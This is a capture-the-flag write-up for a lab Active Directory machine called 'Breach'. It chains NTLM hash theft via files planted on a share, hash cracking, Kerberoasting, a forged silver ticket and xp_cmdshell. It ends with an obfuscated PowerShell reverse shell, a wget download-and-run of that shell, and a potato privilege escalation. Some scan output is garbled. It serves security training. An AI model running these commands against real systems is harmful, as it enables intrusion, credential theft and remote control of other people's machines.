
# Breach

## Nmap

* Nmap results

```console
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-01-05 12:29:47Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subjectuter_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Nam: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Compe: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-05T12:30:39+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

## SMB Shares

* Listing shares

```bash
smbclient -N -L \\\\$IP\\
```

```text
Sharename Type Comment
--------- ---- -------
ADMIN$    Disk Remote Adminx
C$        Disk Default share
IPC$      IPC  Remote IPC
NETLOGON  Disk Logon server share
share     Disk 
SYSVOL    Disk Logon server share
Users     Disk
```

* Nothing useful could be found in the Users share
* Upon visiting the transfer directory in the 'share' share, we can find few users listed in the machine

```text
Users
--------
claire.pope
diana.pope
julia.wong
```

## NTLM Steal

* Hypothetically assuming that someone will visit the share every now and then we can upload a malicious doc which can relay the Logged On user's NTLM to our responder.
* To achieve this we can make use of [https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

```bash
pip3 install xlsxwriter

python3 ntlm_theft.py -g all -s $attacker-ip -f test
```

* navigate to the generated directory and put these files onto the share in the transfer directory, have your responder running before these files were uploaded to the share.

```bash
smbclient -N \\\\$IP\\share

mask ""
RECURSE ON
PROMPT OFF
mput *
```

![ntlm-steal](breach-ntlm-steal.png)

## NTLM hash crack

* The captured NTLM hash can be cracked via hashcat

```bash
hashcat -m 5600 -a 0 julia-hash /usr/share/wordlists/rockyou.txt
```

* To verify if the user is pwned, we can use crackmapexec

```bash
crackmapexec smb -U julia.wong -p "password" --shares
```

![breach-julia-cme](breach-julia-cme.png)

* Upon Inspecting Julia's share we don't find anything valuable.

## BloodHound

* since the machine also has an ADDS running, bloodhound can fetch us further accounts and way to compromise them

```bash
bloodhound-python -u 'julia.wong' -p 'Password' -d breach.vl -ns $IP -c all --zip

```

* We can find the kerberoastable accounts from the report below

![breach-bloodhound](breach-bloodhound.png)

## Kerberoasting

* Kerberosting the svc_mssql account

```bash
impacket-GetUserSPNs -dc-ip breach.vl breach.vl/julia.wong:Password -request
```

## TGS hash crack

* cracking the captured TGS hash

```bash
hashcat -m 13100 -a 0 kerb-hash /usr/share/wordlists/rockyou.txt
```

* verifying the account is pwned via crackmapexec

```bash
crackmapexec smb $IP -U svc_mssql -p 'password'
```

![breach-mssql-cme](breach-svc-mssql-cme.png)

## Silver Ticket

* To craft the silver ticket we need the following things
  * Domain SID
  * NTHash of the svc_mssql (can be obtained by md5 hashing the plain text password)
  * SPN , which can be found in the TGS hash captured
* To get the Domain SID we can use lookupsid from impacket scripts

```bash
impacket-lookupsid svc_mssql:password@$Ip
```

* Forging the ticket

```bash
impacket-ticketer -nthash "69596C7AA1E8DAEE17F8E78870E25A5C" -domain-sid "S-1-5-21-2330692793-3312915120-706255856" -domain "breach.vl" -spn "MSSQLSvc/breachdc.breach.vl:1433" "administrator"
```

* Then export the ccache file

```bash
export KRB5CCNAME=administrator.ccache
```

## MSSQL

* Using impacket's mssql client now we can connect to the machines MSSQL server with our forged ticket

```bash
impacket-mssqlclient -k breachdc.breach.vl
```

![breach-mssql](breach-mssql.png)

* We can enable the xp_cmdshell to issue system commands as mentioned below

```console
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

## Reverse shell via mssql

* As the machine has AntiVirus against basic reverse shells, we have to obfusicate the nishang shell as following.

```powershell
$c = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex ". { $data } 2>&1" | Out-String ); $sb2 = $sb + '#';$seb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($seb,0,$seb.Length);$s.Flush()};$c.Close()
```

```console
xp_cmdshell powershell mkdir C:\Temp\
xp_cmdshell powershell wget http://10.10.10.10/rev.ps1 -O C:\Temp\rev.ps1
xp_cmdshell powershell C:\Temp\rev.psq
```

![breach-reverseshell](breach-reverse-shell.png)

## Privilege Escalation

* as per the available privileges for the user, the SeImpersonatePrivilege can be abused to achieve System own
* We can use [God Potato](https://github.com/BeichenDream/GodPotato) for this also by modifying the the port in the previous script

![breach-root](breach-root.png)
